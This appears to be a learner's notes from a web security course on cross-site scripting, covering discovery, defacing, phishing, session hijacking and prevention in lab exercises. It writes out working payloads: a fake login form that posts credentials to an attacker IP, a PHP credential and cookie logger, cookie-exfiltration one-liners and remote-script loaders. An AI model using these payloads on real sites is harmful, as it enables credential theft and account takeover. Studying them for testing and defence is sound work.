
## Introduction

among the most common web vulnerabilities are XSS attacks   
these take advantage of a flaw in user input sanitation to write JS code to the page and execute it on the client-side 

### What is XSS 

typical web app works by getting HTML code from the back-end server and rendering it on the client-side browser 

a malicious user can inject JS code in an input field for something like a comment or reply so that when another user visits the page they will execute the JS code unknowingly 

XSS solely executed on the client-side; do not directly affect the back-end server   
only affect the user who is executing the vulnerability   

direct impact on back-end server may be low but are common in web apps   
medium risk = low impact + high probability 

we aim to reduce medium risk like this: 

![](Images/Pasted%20image%2020240124110512.png)

### XSS attacks 

wide range of attacks since anything can be executed through the browser JS code   

basic example is having target send their session cookie to an attacker's web server   
another is having the target execute API calls that do things like change their password   
many other types that range from btc mining or displaying ads 

XSS attacks are limited to the browser's JS engine (like V8 in chrome)  
can't execute system-wide JS code  
modern browsers also limit to the same domain of the vulnerable site   
however there are still attacks like finding a binary vulnerability in a web browser (like a heap overflow) to then use XSS to execute JS exploit in browser that breaks out of browser's sandbox to execute code on target's machine 

### Types of XSS

three main types: 
- stored (persistent) XSS = most critical; user input is stored on the backend database and displayed upon retrieval (posts or comments)
- reflected (non-persistent) XSS = user input is displayed on the page after being processed by the backend server but is not stored (search result or error message) 
- DOM-based XSS = non-persistent; user input is directly shown in the browser and is completely processed on the client-side without reaching backend (through client-side http parameters or anchor tags)

## Stored XSS 

stored or persistent XSS that stores our payload on the backend database and is retrieved when the user visits the page means that our attack will affect any user   
furthermore, the payload may need removing from the backend database

for our target site we can see that our input is displayed back to us: 

![](Images/Pasted%20image%2020240124112359.png)

### XSS testing payloads 

we can test if the page is vulnerable to XSS with a basic payload: 

`<script>alert(window.origin)</script>`

![](Images/Pasted%20image%2020240124112606.png)

we can confirm that the page is vulnerable to XSS further by looking at the page source: 

![](Images/Pasted%20image%2020240124112832.png)

many modern web apps use cross-domain IFrames to handle user input so even if the form is vulnerable to XSS then it won't affect the main app    
this is why in our example we are showing the value of `window.origin` in the alert box instead of a value like `1` because then the alert box reveals what URL it is being executed on   
confirms what form is vulnerable in case an IFrame was being used 

some browsers block `alert()` so another payload is to use `<plaintext>` which stops rendering the HTML code and displays it as plaintext    

another easy payload is `<script>print()</script>` which pops up the browser print dialog which is unlikely to be blocked by any browsers 

in our examples we can refresh the page and see our payloads again, which means that the XSS is in fact stored on the backend and will affect any users visiting the page 

to find the flag for this target we can modify our script to get the cookie: 

`<script>alert(document.cookie)</script>`

## Reflected XSS 

reflected XSS gets processed by the backend server and DOM-based is completely processed on the client-side   
both are non-persistent XSS, meaning they are not persistent through page refreshes   
attacks will only affect the target user and not all other users who visit the page

reflected XSS occurs when the input reaches the backend and gets returned to us without being filtered or sanitized   
many cases where our entire input might get returned to us, like error messages or confirmation messages 

with our target we can retry our test string: 

![](Images/Pasted%20image%2020240124135339.png)

we can see that out input `test` is included in the error message   
if this input is not filtered or sanitized then it might be vulnerable to XSS 

we can then try the window.origin payload: 

![](Images/Pasted%20image%2020240124135459.png)

the resulting text says `Task ' '` because our script element does not get rendered by the browser 

we can confirm in the source code that our payload worked: 

![](Images/Pasted%20image%2020240124135629.png)

then when we refresh the page we will not see our payload anymore, meaning that it is non-persistent 

if the XSS is not persistent, how do we target victims with it?  
this depends on the HTTP request being used to send our input to the server  

for this target we can see that the site uses a GET request to perform the add task function: 

![](Images/Pasted%20image%2020240124135909.png)

so to target a user with this vulnerability we can send them a URL containing our payload 

we can copy the url being sent: 

`http://94.237.53.58:36741/index.php?task=test`

then modify it with our payload: 

`http://94.237.53.58:36741/index.php?task=<script>alert(window.origin)</script>`

## DOM XSS 

occurs when JS is used to change the page source through the DOM 

on our target server we can try the test string: 

![](Images/Pasted%20image%2020240124141407.png)

however, when we use the add button there are no requests being made: 

![](Images/Pasted%20image%2020240124141452.png)

in the url we can see that it is using `#`: 

![](Images/Pasted%20image%2020240124141542.png)

this means that it is a client-side parameter that is completely processed on the browser 

we can also see in the pages source that our test string will not appear in it 

### Source and sink 

to understand DOM XSS we need to understand the concept of source and sink of the object displayed on the page  

source = JS object that takes user input, could be anything like URL parameter or input field     
sink = function that writes the user input to a DOM object on the page   

if sink does not sanitize input then it will be vulnerable to XSS 

some common JS functions to write to DOM objects: 
- `document.write()`
- `DOM.innerHTMl`
- `DOM.outerHTMl`

some jquery functions that write to DOM: 
- `add()`
- `after()` 
- `append()`

the above functions will not sanitize input and will output it exactly 

viewing the page source we can see that the source is being taken from the task parameter: 

![](Images/Pasted%20image%2020240124143017.png)

we can see that .innerHTML is being used to write the task variable in the todo DOM 

### DOM attacks

innerHTML will not allow script tags as input but other payloads will work like: 

`<img src="" onerror=alert(window.origin)>`

this will create an image object with an onerror attribute that executes JS code when the image isn't found   
our code will always be executed because we provide a blank image link

to target users with this vulnerability we can again use the URL: 

`http://83.136.251.235:49425/#task=%3Cimg%20src=%22%22%20onerror=alert(document.cookie)%3E`

## XSS Discovery 

### Automated discovery 

almost all web app vulnerability scanners have XSS detection   
usually do two types of scanning, passive and active 

active scans work by sending various XSS payloads into input fields and comparing the rendered page source to see if the payload can be found in it, which might indicate successful XSS 

must always manually confirm any found injections 

common open source tools for XSS discovery: 
- XSS strike 
- Brute XSS
- XSSer

can try XSS strike by cloning it: 

```shell
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

then run the script and provide url with `-u`: 

```shell
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

### Manual discovery 

difficulty of finding XSS depends on level of security of the app   
advanced XSS usually involves code review skills 

#### XSS payloads

most basic method of looking for vulnerabilities is manually testing various XSS payloads 

can find lists of XSS payloads online like: 
- payloadallthethings
- payloadbox 

XSS can be injected into any input in the HTML page like input fields or HTTP headers like Cookie or User-Agent

many payloads will not work for all test cases because they are all designed to work with certain types of injections 

### Code review 

most reliable method of detecting XSS is code review   
can write custom payloads based on how our input is being handled   

unlikely to find any XSS through payload lists or XSS tools for advanced web apps 

look into 
- secure coding 101
- whitebox pentesting 101: command injection 

to try some of these techniques we can see our target has a registration form: 

![](Images/Pasted%20image%2020240124152327.png)

when filling out a dummy form we can capture the URL: 

![](Images/Pasted%20image%2020240124152354.png)

`http://94.237.54.75:32571/?fullname=test&username=e&password=asdf&email=g%40gmail.com`

using this url we can run it through tools like XSStrike: 

![](Images/Pasted%20image%2020240124153204.png)

and we can see from the results that the email field looks to be vulnerable: 

![](Images/Pasted%20image%2020240124153229.png)

when normally using the UI any payloads will not be accepted, but by modifying the URL we can see our input being reflected: 

![](Images/Pasted%20image%2020240124153323.png)

## Defacing 

one of the most common stored XSS vulnerabilities is website defacing  
defacing is changing its look for anyone who visits the site 

many other vulnerabilities to accomplish this but XSS is among the most common

### Defacing elements 

three elements are commonly used to change the main look of the page: 
- background color = document.body.style.background
- background = document.body.background
- page title = document.title 
- page text = DOM.innerHTML

we can use these to send a message or even remove the vulnerable element so that it would be harder to quickly reset the page

### Changing the background

in our stored XSS target we can use a color or image to change the background of the site

our payload becomes something like: 

`<script>document.body.sytle.background = "#141d2b"</script>`

using this on a vulnerable stored XSS site we can see the site change even after refreshing: 

![](Images/Pasted%20image%2020240124171450.png)

### Changing page title

to change the title we can modify our script to be: 

`<script>document.title = 'HackTheBox Academy'</script>`

![](Images/Pasted%20image%2020240124171932.png)

### Changing the page text 

to modify the text of a page we can select an element in our script: 

`document.getElementById("todo").innerHTML = "New Text"`

jquery can be more efficient in changing multiple elements in one line (jquery must be loaded): 

`$("#todo").html('New Text')` 

could even change the whole HTML code with: 

`document.getElementsByTagName('body')[0].innerHTML = "New Text"`

to push our final payload we will want to minify it into one line: 

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

we can see our payloads at the end of the page's source code: 

![](Images/Pasted%20image%2020240124180831.png)

in this example the elements we are targeting are at the end of the source code but if we wanted to inject on an element in the middle of the source then other scripts/elements might require modifications to our payload

## Phishing

common form of XSS phishing is injecting fake login forms that send the login details to the attacker's server 

### XSS Discovery 

our target is an image URL form that displays our URL via a URL parameter: 

![](Images/Pasted%20image%2020240124181541.png)

when we try some of our basic payloads we don't get any results but we can understand from the source code how our input is being used: 

![](Images/Pasted%20image%2020240124181848.png)

in this we can see that our input is being placed directly into the `src` attribute without any sanitation 

now we can try a payload like: 

`'> <script>alert(window.origin)</script>`

this exploits the direct input by closing the `img` tag in the source code to then execute the input script

![](Images/Pasted%20image%2020240124182309.png)

### Login form injection 

to perform an XSS phishing attack we need to inject HTML that displays a login form on the targeted page

first we create an HTML form that is seemingly legit: 

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

with this form we specify the form action to be our own server's IP so that we can listen for any given credentials

using `document.write()` we can write our minified HTML to the page using the XSS vulnerability we found

````javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
````

our payload becomes: 

```HTML 
'> <script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

![](Images/Pasted%20image%2020240124192630.png)
### Cleaning up 

we were successful in inserting our form but now we should modify the script to remove the image field to make it more believable 

we can add `document.getElementById('urlform').remove()` to our payload:

![](Images/Pasted%20image%2020240124192821.png)

then we can also comment out the trailing text at the end of our form with `<!--`

![](Images/Pasted%20image%2020240124192917.png)

now our final payload looks like: 

```
'> <script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.210:81><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--
```

### Credential stealing

now that our payload is ready we need to setup our server to steal the credentials that might be passed by the user 

lets start a netcat server: 

`sudo nc -lvnp 81`

then when we login with our payload url we can see the HTTP request come through on our server: 

![](Images/Pasted%20image%2020240124195526.png)

however, we are currently only listening, so the user will get an error because we aren't responding  
we can use a basic PHP script that logs credentials from the HTTP requests and then returns the victim to the original page 

here is an example script: 

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

we can save this as `index.php` and put it in `/tmp/tmpserver/`

then we can instead start a PHP server instead of netcat: 

```shell
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

![](Images/Pasted%20image%2020240124200231.png)

then with our script it will redirect users after stealing the credentials, then if we check the creds.txt file we can see all of the collected credentials

## Session Hijacking

modern web apps use cookies to maintain a user's session throughout browsing sessions    
if a threat actor obtains these cookies then they might be able to gain logged-in access with the victim's account without knowing their credentials 

session hijacking = cookie stealing 

### Blind XSS detection 

blind XSS occurs when the vulnerability is triggered on a page we don't have access to 

these typically occur with forms only accessible by certain users like admins, some examples are: 
- contact forms
- reviews
- user details
- support tickets 
- HTTP User-Agent header 

our test site shows a login form that on submit redirects us: 

![](Images/Pasted%20image%2020240124202330.png)

this indicates that we won't see how our input will be handled or how it will look in the browser, since it will appear for the admin only   

we do not have access to the admin panel so we can't do our normal tests to see which payloads get a response   
so how will we know when we get a successful injection? 

to do this we can do the same trick of using a payload that sends an HTTP request back to our server   
if the JS code gets executed we will get a response on our machine 

however there are two issues: 
- how can we know what specific field is vulnerable?
- how can we know what XSS payload to use? 

### Loading a remote script 

in HTML we can load a remote JS file with: 

`<script src="http://OUR_IP/script.js"></script>`

we can change the requested script name to the name of the field we are injecting in, so that when we get the request in our VM we will know what the vulnerable input field that executed the script is: 

`<script src="http://OUR_IP/username"></script>`

if we get a request for `/username` then we know that it is vulnerable to XSS   
so now we can start testing XSS payloads that load a remote script and see which one sends us a request

some examples from payloadsallthethings: 

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

if we had access to the source code like in DOM XSS then we could be more precise in what would work for an injection   
blind XSS is much more successful with DOM 

so now we can go back to our form and inject these script tags with their relative names: 

![](Images/Pasted%20image%2020240124204014.png)

or we can use the full url:

`http://10.129.46.176/hijacking/?fullname=<script src=http://10.10.15.210/fullname></script>&username=<script src=http://10.10.15.210/username></script>&password=<script src=http://10.10.15.210/password></script>&email=<script src=http://10.10.15.210/email></script>&imgurl=<script src=http://10.10.15.210/imgurl></script>`

although we notice that even by not going through the UI the email field will always return invalid, meaning there is frontend and backend validation: 

![](Images/Pasted%20image%2020240124204359.png)

this means that it is not vulnerable and we can skip it   
we may also want to skip the password variable because these are usually hashed and not shown in cleartext 

our URL looks like: 

`http://10.129.151.122/hijacking/?fullname=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Ffullname%3E%3C%2Fscript%3E&username=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Fusername%3E%3C%2Fscript%3E&password=test&email=test%40test.com&imgurl=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Fimgurl%3E%3C%2Fscript%3E`

and when we go through and test different types of payloads we can see that the image url upload field is vulnerable after using the payload that starts with `">`:

![](Images/Pasted%20image%2020240124205303.png)

### Session hijacking 

session hijacking is very similar to phishing, we will need a JS payload to send us the required data and a PHP script on our server to grab and parse the transmitted data   

there are many JS payloads to grab the session cookie like: 

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

the first will navigate to our cookie grabber page and the second adds an image to the page

we can add either of these into our php server into `script.js`

now we can use our script as part of the vulnerable input field and we should get calls to our server with session cookies   
however, if there are a lot of cookies then we might not know which cookie belongs to which header   
this is where we can use our PHP script to parse them and write them to file: 

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

then, assuming we have use our payload to load the script.js file, when the user's browser executes the code we will get a response on our server with the cookie value: 

![](Images/Pasted%20image%2020240124210426.png)

so now we can go to the login page and add a cookie in our devtools to match the one we found: 

![](Images/Pasted%20image%2020240124210653.png)

then refreshing the page we can see that we have successfully logged in: 

![](Images/Pasted%20image%2020240124210737.png)

## XSS Prevention 

XSS vulnerabilities are mainly linked to two parts of the web app, a source that is input and a sink that displays the input data   
these are what we want to focus on securing 

the most important part of preventing XSS is sanitation and validation 

### Front-end

essential to sanitize and validate the user input  

we saw in the previous exercise that emails needed to be in a certain format, the code that did this was: 

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

we should also make sure that no input contains JS code in it by escaping any special characters 

for this we can use things like = `DOMPurify`: 

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

this will escape special characters with a backslash 

we also don't want to use user input directly into HTML tags like: 
- `<script>`
- `<style>`
- tag/attribute fields - `<div name='INPUT'>`
- comments

we should also avoid using JS functions that allow changing raw text of HTML fields like: 
- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

or other jquery functions like: 
- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

### Back-end

XSS prevention on the back end would include measures like: 
- I/O sanitation and validation
- server config 
- backend tools to prevent XSS

validation is similar to frontend where it uses regex or library functions to ensure that the input field is what is expected 

backend systems play a crucial role in input sanitation because frontend sanitation can be bypassed by using HTTP requests directly 

for something like a PHP backend we could use `addlashes` to escape special characters: 

`addlashes($_GET['email'])`

another important aspect of backend is output encoding   
this is encoding any special characters into their HTML codes   
this helps if we need to display the entire user input without introducing XSS  

for php you could use something like `htmlentities()` or `htmlspecialchars()` 

there are also certain server configurations that might help in preventing XSS:
- using HTTPS
- using XSS prevention headers
- using the appropriate Content-Type like `X-Content-Type-Options=nosniff`
- using `Content-Security-Policy` options like `script-src 'self'` which only allows locally hosted scripts 
- using `HttpOnly` and `Secure` cookie flags to prevent JS from reading cookies and only transport over HTTPS

WAF also reduces chances of XSS   
some frameworks like ASP.NET have built in XSS protections 

## Skills Assessment 

conducting a web pen test and focusing on XSS 

have a target site and the `/assessment` directory 

use our skills to: 
- identify a vulnerable input field
- find a working XSS payload 
- try to steal a victim's cookies using session hijacking 

opening the target page we can see a search form and a comment submission form: 

![](Images/Pasted%20image%2020240125092738.png)

![](Images/Pasted%20image%2020240125092748.png)

first I try to use the search form but it appears that there is sanitation on special characters: 

![](Images/Pasted%20image%2020240125093239.png)

![](Images/Pasted%20image%2020240125093255.png)

then looking at the comment submission page there is a note about comments being approved by an admin first, so this leads me to think a blind xss attack may be an option: 

![](Images/Pasted%20image%2020240125093412.png)

knowing this, lets begin using the form to find vulnerable fields using blind XSS techniques 

first lets setup our server to listen for responses, for now I will use a netcat server: 

![](Images/Pasted%20image%2020240125100340.png)

using inputs like `<script src="http://10.10.15.210:81/name"></script>` for each of the input fields and submitting the form gives us this error: 

![](Images/Pasted%20image%2020240125100733.png)

it appears the name and email fields are sanitized or validated so we will again try without those and get a response from the website url field: 


![](Images/Pasted%20image%2020240125100858.png)

now that this appears to be the vulnerable field we can use it to try to execute a custom script on our server

we will need to setup a PHP server to host our javascript file  

first I create the `/tmp/tmpserver` directory and add an index.php file with: 

![](Images/Pasted%20image%2020240125101322.png)

then I create a script.js file in the same directory with the Image() payload: 

![](Images/Pasted%20image%2020240125101435.png)

now I start listening on the PHP server: 

![](Images/Pasted%20image%2020240125101520.png)

then I again use the form with our vulnerable fields to load the script.js file: 

![](Images/Pasted%20image%2020240125101812.png)

and on the php server I obtain the flag: 

![](Images/Pasted%20image%2020240125101851.png)

